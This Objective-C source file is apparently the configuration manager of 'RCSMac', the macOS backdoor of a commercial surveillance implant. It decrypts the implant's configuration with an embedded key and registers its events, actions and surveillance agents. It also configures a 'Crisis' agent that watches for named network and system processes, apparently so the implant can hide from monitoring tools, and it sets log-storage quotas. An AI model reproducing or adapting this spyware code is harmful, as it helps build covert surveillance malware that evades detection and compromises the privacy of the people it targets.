/*
 * RCSMac - ConfiguraTor(i)
 *  This class will be responsible for all the required operations on the 
 *  configuration file.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <sys/types.h>
#include <wchar.h>

#import "RCSMConfManager.h"
#import "RCSMTaskManager.h"
#import "RCSMEncryption.h"
#import "RCSMCommon.h"
#import "RCSMUtils.h"
#import "RCSMDiskQuota.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


#pragma mark -
#pragma mark Private Interface
#pragma mark -

@interface RCSMConfManager (hidden)

- (BOOL)_searchDataForToken: (NSData *)data
                      token: (char *)token
                   position: (u_long *)outPosition;

- (u_long)_parseEvents:   (NSData *)aData nTimes: (int)nTimes;
- (BOOL)_parseActions:    (NSData *)aData nTimes: (int)nTimes;
- (BOOL)_parseAgents:     (NSData *)aData nTimes: (int)nTimes;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSMConfManager (hidden)

- (BOOL)_searchDataForToken: (NSData *)data
                      token: (char *)token
                   position: (u_long *)outPosition
{
  u_long counter = 0;
  
  for (;;)
    { 
      if (!strcmp((char *)[data bytes] + counter, token))
        {
          *(outPosition) = counter;
          return YES;
        }
      
      counter += 1;
    }
  
  return NO;
}

//
// Quick Note
//  After the event section there all the raw actions, thus we need to call
//  the parseActions right after this /* No comment */
//
- (u_long)_parseEvents: (NSData *)aData nTimes: (int)nTimes
{
  eventStruct *header;
  NSData *rawHeader;
  int i;
  int pos = 0;
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(eventStruct)];
      
      header = (eventStruct *)[rawHeader bytes];
#ifdef DEBUG_CONF_MANAGER
      verboseLog(@"event size: %x", header->internalDataSize);
      verboseLog(@"event type: %x", header->type);
#endif
      if (header->internalDataSize)
        {
          NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                            length: header->internalDataSize];
          //infoLog(@"event data: %@", tempData);
          
          [taskManager registerEvent: tempData
                                type: header->type
                              action: header->actionID];
        }
      else
        [taskManager registerEvent: nil
                              type: header->type
                            action: header->actionID];
      
      // Jump to the next event (dataSize + PAD)
      pos += header->internalDataSize + 0xC;
      //infoLog(@"pos %x", pos);
    }
  
  return pos + 0x10;
}

- (BOOL)_parseActions: (NSData *)aData nTimes: (int)nTimes
{
  actionContainerStruct *headerContainer;
  actionStruct *header;
  NSData *rawHeader;
  int i, z;
  int pos = 0;
  
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {      
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(actionContainerStruct)];
      //infoLog(@"RAW Header: %@", rawHeader);

      headerContainer = (actionContainerStruct *)[rawHeader bytes];
      //infoLog(@"subactions (%d)", headerContainer->numberOfSubActions);

      pos += sizeof(actionContainerStruct);
      //infoLog(@"subactions: %d", headerContainer->numberOfSubActions);
      //pos += headerContainer->internalDataSize;
      
      for (z = 0; z < headerContainer->numberOfSubActions; z++)
        {
          rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                     length: sizeof(actionStruct)];
          header = (actionStruct *)[rawHeader bytes];
#ifdef DEBUG_CONF_MANAGER
          verboseLog(@"RAW Header: %@", rawHeader);
          verboseLog(@"action type: %x", header->type);
          verboseLog(@"action size: %x", header->internalDataSize);
#endif
          if (header->internalDataSize > 0)
            {
              NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0x8
                                                length: header->internalDataSize];
              
              //infoLog(@"%@", tempData);
              pos += header->internalDataSize + 0x8;
              
              [taskManager registerAction: tempData
                                     type: header->type
                                   action: i];
            }
          else
            {
              [taskManager registerAction: nil
                                     type: header->type
                                   action: i];
              
              pos += sizeof(int) << 1;
            }
        }
    }
  
  return YES;
}

- (void)initCrisisAgentParamsWithData: (NSData*)aData
                            andStatus: (UInt32)aStatus
{
#ifdef DEBUG_CONF_MANAGER
  infoLog(@"parse Crisis agent structs core %@", [[NSBundle mainBundle] executablePath]);
#endif
  
  if (gAgentCrisisApp != nil) 
  {
    [gAgentCrisisApp release];
    gAgentCrisisApp = nil;
  }
  
  if (gAgentCrisisNet != nil) 
  {
    [gAgentCrisisNet release];
    gAgentCrisisNet = nil;
  }
  
  crisisConfStruct *crisis_conf = (crisisConfStruct *)[aData bytes];
  
  char *process_name = crisis_conf->process_names;
  
  if (crisis_conf->check_network)
  {
    for (int i=0; i<crisis_conf->network_process_count; i++) 
    {
      int len = _utf16len((unichar*)process_name) * sizeof(unichar);
      
  #ifdef DEBUG_CONF_MANAGER
      NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
      
      infoLog(@"process_name bytes (%@)", tmpD);
      
      [tmpD release];
  #endif
      
      NSString *tmpAppName = [[NSString alloc] initWithBytes: process_name 
                                                      length: len 
                                                    encoding: NSUTF16LittleEndianStringEncoding];
      
  #ifdef DEBUG_CONF_MANAGER
      infoLog(@"network_process no. %d %@ len (%d)", i, tmpAppName, len);
  #endif
      
      if (gAgentCrisisNet == nil)
        gAgentCrisisNet = [[NSMutableArray alloc] initWithCapacity: 0];
      
      [gAgentCrisisNet addObject: (id)tmpAppName];
      
      [tmpAppName release];
      
      process_name += (len+sizeof(unichar)); 
    }
  }
  
  if (crisis_conf->check_system)
  {
    for (int i=0; i<crisis_conf->system_process_count; i++) 
    {
      int len =_utf16len((unichar*)process_name)*sizeof(unichar);
      
  #ifdef DEBUG_CONF_MANAGER
      NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
      
      infoLog(@"process_name bytes (%@)", tmpD);
      
      [tmpD release];
  #endif
      
      NSString *tmpAppName = [[NSString alloc] initWithBytes: process_name 
                                                      length: len 
                                                    encoding: NSUTF16LittleEndianStringEncoding];
      if (gAgentCrisisApp == nil)
        gAgentCrisisApp = [[NSMutableArray alloc] initWithCapacity: 0];
      
  #ifdef DEBUG_CONF_MANAGER
      infoLog(@"system_process no. %d (%@) len (%d)", i, tmpAppName, len);
  #endif
      
      [gAgentCrisisApp addObject: (id)tmpAppName];
      
      [tmpAppName release];
      
      process_name += (len+sizeof(unichar)); 
    }
  }
  
  if (aStatus == 0) 
  {
#ifdef DEBUG_CONF_MANAGER
    infoLog(@"Crisis agent stopped by default");
#endif
    gAgentCrisis = CRISIS_STOP;
  }
  else
  {
#ifdef DEBUG_CONF_MANAGER
    infoLog(@"Crisis agent started by default");
#endif
    gAgentCrisis = CRISIS_START;  
  }
}

- (BOOL)_parseAgents: (NSData *)aData nTimes: (int)nTimes
{
  agentStruct *header;
  NSData *rawHeader, *tempData;
  int i;
  u_long pos = 0;
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(agentStruct)];
      
      header = (agentStruct *)[rawHeader bytes];
      
#ifdef DEBUG_CONF_MANAGER
      infoLog(@"agent ID: %x", header->agentID);
      infoLog(@"agent status: %d", header->status);
#endif
      
      if (header->internalDataSize)
        {
          // Workaround for re-run agent DEVICE every sync
          if (header->agentID == LOGTYPE_DEVICE)
            {
              deviceStruct tmpDevice;

              if (header->status == 1)
                tmpDevice.isEnabled = AGENT_DEV_ENABLED;
              else
                tmpDevice.isEnabled = AGENT_DEV_NOTENABLED;

              tempData = [NSData dataWithBytes: &tmpDevice length: sizeof(deviceStruct)];

              memcpy((void*)[tempData bytes], (void*)[aData bytes] + pos + 0xC, sizeof(UInt32)); 

#ifdef DEBUG_CONF_MANAGER
              infoLog(@"AGENT DEVICE additional header %@", tempData);
#endif
            }
          else
            {
              tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                        length: header->internalDataSize];
            }
          //infoLog(@"%@", tempData);
          // Jump to the next event (dataSize + PAD)
          pos += header->internalDataSize + 0xC;
          
          // Configure Crisis params
          if (header->agentID == AGENT_CRISIS)
            {
              [self initCrisisAgentParamsWithData: tempData
                                        andStatus: header->status];
            }
          
#ifdef DEBUG_CONF_MANAGER
          verboseLog(@"agent 0x%x: %@", header->agentID, tempData);
#endif
          [taskManager registerAgent: tempData
                             agentID: header->agentID
                              status: header->status];
        }
      else
        {
          pos += 0xC;
          
          [taskManager registerAgent: nil
                             agentID: header->agentID
                              status: header->status];
        }
      
      //infoLog(@"pos %x", pos);
    }
  
  return pos + 0x10;
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSMConfManager

- (id)initWithBackdoorName: (NSString *)aName
{
  self = [super init];
  
  if (self != nil)
    {
#ifdef DEV_MODE
      unsigned char result[CC_MD5_DIGEST_LENGTH];
      CC_MD5(gConfAesKey, strlen(gConfAesKey), result);

      NSData *temp = [NSData dataWithBytes: result
                                    length: CC_MD5_DIGEST_LENGTH];
#else
      NSData *temp = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
#endif
      
      mEncryption = [[RCSMEncryption alloc] initWithKey: temp];
    }
  
  return self;
}

- (void)dealloc
{
  [mEncryption release];
  
  [super dealloc];
}

- (BOOL)loadConfiguration
{
  NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: configurationFile])
    {
      int numberOfOccurrences;
      NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
      
      [configurationFile release];
      
      if (configuration != nil)
        {
          RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
          
          //
          // For safety we remove all the previous objects
          //
          [taskManager removeAllElements];
          
#ifdef DEBUG_CONF_MANAGER
          [configuration writeToFile: @"/tmp/conf_decrypted.bin"
                          atomically: YES];
#endif
          
          int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
          int endOfConfData;
          
          [configuration getBytes: &endOfConfData
                            range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
          
          // Exclude sizeof(Final CRC) + sizeof(LEN field)
          endOfConfData = endOfConfData - sizeof(int) * 2;
          
          @try
            {
              mConfigurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
                                                                                endOfConfData)];
            }
          @catch (NSException *e)
            {
#ifdef DEBUG_CONF_MANAGER
              errorLog(@"%s exception", __FUNCTION__);
#endif
              
              return NO;
            }
          
          u_long pos = 0;
          int offsetActions = 0;
          
          if ([self _searchDataForToken: mConfigurationData
                                  token: EVENT_CONF_DELIMITER
                               position: &pos] == YES)
            {
              // Skip the EVENT Token + \00
              pos += strlen(EVENT_CONF_DELIMITER) + 1;
              
              //
              // Read num of events
              //
              [mConfigurationData getBytes: &numberOfOccurrences
                                     range: NSMakeRange(pos, sizeof(int))];
#ifdef DEBUG_CONF_MANAGER
              verboseLog(@"Parsing (%d) Events at offset (%x)", numberOfOccurrences, pos);
#endif
              // Skip numberOfEvents (DWORD)
              pos += sizeof(int);
              NSData *tempData;
              
              @try
                {
                  tempData = [mConfigurationData subdataWithRange:
                              NSMakeRange(pos, endOfConfData - pos)];
                }
              @catch (NSException *e)
                {
#ifdef DEBUG_CONF_MANAGER
                  errorLog(@"%s exception", __FUNCTION__);
#endif
                
                  return NO;              
                }
              
              offsetActions = [self _parseEvents: tempData nTimes: numberOfOccurrences];
            }
          else
            {
#ifdef DEBUG_CONF_MANAGER
              errorLog(@"event - searchDataForToken sux");
#endif
              
              return NO;
            }
          
          //
          // parseActions here since our wonderful/functional/flexible/extendible configuration
          // file doesn't have an action header, obfuscation FTW
          //
#ifdef DEBUG_CONF_MANAGER
          verboseLog(@"Offset: %x", offsetActions);
#endif
          // Read num of actions
          [mConfigurationData getBytes: &numberOfOccurrences
                                 range: NSMakeRange(offsetActions, sizeof(int))];
#ifdef DEBUG_CONF_MANAGER
          verboseLog(@"Parsing (%d) Actions at offset (%x)", numberOfOccurrences, offsetActions);
#endif
          // Skip numberOfActions (DWORD)
          offsetActions += sizeof(int);
          NSData *tempData;
          
          @try
            {
              tempData = [mConfigurationData subdataWithRange:
                          NSMakeRange(offsetActions, endOfConfData - offsetActions)];
            }
          @catch (NSException *e)
            {
#ifdef DEBUG_CONF_MANAGER
              errorLog(@"%s exception", __FUNCTION__);
#endif
          
              return NO;              
            }
          
          //infoLog(@"actions %@", tempData);
          [self _parseActions: tempData nTimes: numberOfOccurrences];
          
          if ([self _searchDataForToken: mConfigurationData
                                  token: AGENT_CONF_DELIMITER
                               position: &pos] == YES)
            {
              // Skip the EVENT Token + \00
              pos += strlen(AGENT_CONF_DELIMITER) + 1;
              
              //
              // Read num of agents
              //
              [mConfigurationData getBytes: &numberOfOccurrences
                                     range: NSMakeRange(pos, sizeof(int))];
#ifdef DEBUG_CONF_MANAGER
              verboseLog(@"Parsing (%d) Agents at offset (%x)", numberOfOccurrences, pos);
#endif
              // Skip numberOfAgents (DWORD)
              pos += sizeof(int);
              NSData *tempData;
              
              @try
                {
                  tempData = [mConfigurationData subdataWithRange:
                              NSMakeRange(pos, endOfConfData - pos)];
                }
              @catch (NSException *e)
                {
#ifdef DEBUG_CONF_MANAGER
                  errorLog(@"%s exception", __FUNCTION__);
#endif
              
                  return NO;              
                }
              
              [self _parseAgents: tempData nTimes: numberOfOccurrences];
            }
          else
            {
#ifdef DEBUG_CONF_MANAGER
              errorLog(@"agents - searchDataForToken sux");
#endif
              
              return NO;
            }
            
          // setting global quota params
          if ([self _searchDataForToken:mConfigurationData 
                                  token:LOGRP_CONF_DELIMITER 
                               position:&pos])
            {
              // Skip the EVENT Token + \00
              pos += strlen(LOGRP_CONF_DELIMITER) + 1;
             
              UInt32 globalConfBytes[3];
              
              [mConfigurationData getBytes:globalConfBytes
                                     range:NSMakeRange(pos, sizeof(UInt32)*3)];
              
              NSData *tmpGlobalConf = [[NSData alloc] initWithBytes:globalConfBytes
                                                             length:sizeof(UInt32)*3];
                                                              
              [[RCSMDiskQuota sharedInstance] setGlobalQuotaParam:tmpGlobalConf];
              
              [tmpGlobalConf release];                                                 
            }
        }
      else
        {
          return NO;
        }
    }
  else
    {
#ifdef DEBUG_CONF_MANAGER
      errorLog(@"Configuration file not found @ %@", configurationFile);
#endif
      [configurationFile release];
      
      return NO;
    }
  
  return YES;
}

- (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL rVal = NO;
  int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
  int endOfConfData;
  NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
  
  [configuration getBytes: &endOfConfData
                    range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
  
  // Exclude sizeof(Final CRC) + sizeof(LEN field)
  endOfConfData = endOfConfData - sizeof(int) * 2;
  NSData *configurationData = nil;
  
  @try
    {
      configurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
                                                                       endOfConfData)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_CONF_MANAGER
      errorLog(@"exception on configData makerange (%@)", [e reason]);
#endif
    }

  
  u_long pos = 0;
  
  if ([self _searchDataForToken: configurationData
                          token: ENDOF_CONF_DELIMITER
                       position: &pos] == YES)
    rVal = YES;
  else 
    rVal = NO;
  
  [pool release];
  
  return rVal;
}

- (RCSMEncryption *)encryption
{
  return mEncryption;
}

@end
